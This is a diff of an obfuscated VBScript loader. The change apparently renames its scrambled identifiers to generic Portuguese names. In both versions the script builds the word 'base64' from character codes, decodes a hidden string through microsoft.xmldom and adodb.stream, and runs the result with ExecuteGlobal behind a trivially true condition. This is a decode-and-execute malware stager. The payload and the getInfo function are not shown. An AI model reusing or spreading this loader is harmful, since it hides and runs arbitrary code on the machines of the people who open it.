@@ -1,10 +1,10 @@
-Class DailyMotn
-    Function noGlkJ(BallzG)
-	set o = BallzG(2).createElement(BallzG(1))
+Class classe1
+    Function funcao1(parametro)
+	set o = parametro(2).createElement(parametro(1))
 	o.DataType = Array("bin.base64")(0)
-        o.Text = BallzG(0)
-        If (BallzG(3)(0) & BallzG(3)(1)) = ("ba" & "se") Then
-            noGlkJ = Array(o.NodeTypedValue)
+        o.Text = parametro(0)
+        If (parametro(3)(0) & parametro(3)(1)) = ("ba" & "se") Then
+            funcao1 = Array(o.NodeTypedValue)
         End If
     End Function
 
@@ -19,21 +19,21 @@ Class DailyMotn
     End Function
 End Class
 
-Set subs = New DailyMotn
-g1z4rd = subs.getInfo("labito")
-g1z4rdo = Replace(g1z4rd(0), g1z4rd(1), g1z4rd(2))
-Set nano = CreateObject("microsoft.xmldom")
-g1z4rd = Array(g1z4rdo, "ktc", nano, Array(chr(98) & chr(97), chr(115) & chr(101), chr(54) & chr(52)))
+Set objClasse1 = New classe1
+variavel1 = objClasse1.getInfo("labito")
+variavel2 = Replace(variavel1(0), variavel1(1), variavel1(2))
+Set variavel3 = CreateObject("microsoft.xmldom")
+variavel1 = Array(variavel2, "ktc", variavel3, Array(chr(98) & chr(97), chr(115) & chr(101), chr(54) & chr(52)))
 
-g1z4rd = Array(CreateObject("adodb.stream"), subs.noGlkJ(g1z4rd), "us-ascii")
-g1z4rd(0).Type = 1
-g1z4rd(0).Open
-g1z4rd(0).Write g1z4rd(1)(0)
-g1z4rd(0).Position = 0
-g1z4rd(0).Type = 2
-g1z4rd(0).CharSet = g1z4rd(2)
+variavel1 = Array(CreateObject("adodb.stream"), objClasse1.funcao1(variavel1), "us-ascii")
+variavel1(0).Type = 1
+variavel1(0).Open
+variavel1(0).Write variavel1(1)(0)
+variavel1(0).Position = 0
+variavel1(0).Type = 2
+variavel1(0).CharSet = variavel1(2)
 
 
-If chr(97) = "a" And g1z4rd(0).CharSet = "us-ascii" Then
-	ExecuteGlobal subs.getInfo(g1z4rd(0))(0)
+If chr(97) = "a" And variavel1(0).CharSet = "us-ascii" Then
+	ExecuteGlobal objClasse1.getInfo(variavel1(0))(0)
 End If
